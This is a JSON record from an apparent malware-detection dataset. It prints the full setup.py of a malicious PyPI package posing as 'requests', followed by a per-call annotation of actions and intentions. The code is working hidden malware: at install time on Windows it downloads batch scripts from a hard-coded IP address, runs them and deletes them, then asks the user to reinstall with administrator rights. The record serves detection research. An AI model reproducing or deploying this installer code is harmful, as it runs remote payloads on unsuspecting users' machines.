{
  "metadata": {
    "package_name": "new-request-2022-4.5.1",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/new-request-2022-4.5.1.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/new-request-2022-4.5.1.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport sys\nimport base64\nfrom time import sleep\n\nif os.name == 'nt':\n  try:\n    import subprocess\n    a = subprocess.Popen(\"echo %temp%\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE)\n    out = (a.stdout.read().decode().strip())\n    os.chdir(out)\n    try:\n      import requests\n    except:\n      subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'requests'], shell=True, stdin=subprocess.PIPE,\n                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      print(\"installing....\")\n      sleep(5)\n      import requests\n    remote_url = 'http://52.14.229.35:1122/connect-CANDC.txt'\n    local_file = 'local_copy.txt'\n    data = requests.get(remote_url)\n    # Save file data to local copy\n    with open(local_file, 'wb')as file:\n      file.write(data.content)\n    subprocess.Popen(\"cmd /c move local_copy.txt local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    subprocess.Popen(\"cmd /c local.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,stderr=subprocess.PIPE)\n    sleep(2)\n    try:\n      subprocess.Popen(\"cmd /c del local.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    except:\n      pass\n    a = subprocess.Popen(\"net session\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    out = (a.stderr.read().decode())\n    if \"Access is denied.\" in out:\n      print(\"The library can do problems, Reinstall with Administrative permissions to solve the problem\")\n    else:\n      remote_url = 'http://52.14.229.35:1122/shoomsha.jpg'\n      local_file = 'local_b.txt'\n      data = requests.get(remote_url)\n      # Save file data to local copy\n      with open(local_file, 'wb')as file:\n        file.write(data.content)\n      subprocess.Popen(\"cmd /c move local_b.txt loc.bat\", shell=True, stdin=subprocess.PIPE,\n                       stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      subprocess.Popen(\"cmd /c loc.bat\", shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n                       stderr=subprocess.PIPE)\n      sleep(2)\n      try:\n        subprocess.Popen(\"cmd /c del loc.bat\", shell=True, stdin=subprocess.PIPE,\n                         stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n      except:\n        pass\n        print(\"\"\"installed successfully\n#Usage: import requests\n            \"\"\")\n  except Exception as e:\n      pass",
          "triple_sequences": [
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "echo %temp%",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "a.stdout.read()",
              "action_description": "Reads all bytes from process standard output",
              "action_id": "read_process_stdout",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode command output",
              "intention_id": "decode_command_output"
            },
            {
              "action_api": "str.strip()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "os.chdir()",
              "action_description": "Changes current working directory",
              "action_id": "change_working_dir",
              "object": "out",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Change working directory",
              "intention_id": "change_working_directory"
            },
            {
              "action_api": "subprocess.check_call()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "[sys.executable, '-m', 'pip', 'install', 'requests']",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Install required Python package",
              "intention_id": "install_required_python_package"
            },
            {
              "action_api": "sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "5",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "http://52.14.229.35:1122/connect-CANDC.txt",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "local_copy.txt",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "data.content",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "cmd /c move local_copy.txt local.bat",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Move file to destination",
              "intention_id": "move_file_destination"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "cmd /c local.bat",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "cmd /c del local.bat",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "net session",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Check admin privileges",
              "intention_id": "check_admin_privileges"
            },
            {
              "action_api": "a.stderr.read()",
              "action_description": "Reads all bytes from process standard error",
              "action_id": "read_process_stderr",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access command error output",
              "intention_id": "access_command_error_output"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using default codec",
              "action_id": "decode_bytes_default",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Decode command output",
              "intention_id": "decode_command_output"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "http://52.14.229.35:1122/shoomsha.jpg",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "local_b.txt",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "data.content",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "cmd /c move local_b.txt loc.bat",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Move file to destination",
              "intention_id": "move_file_destination"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "cmd /c loc.bat",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute file",
              "intention_id": "execute_file"
            },
            {
              "action_api": "sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "cmd /c del loc.bat",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            }
          ]
        }
      ]
    }
  ]
}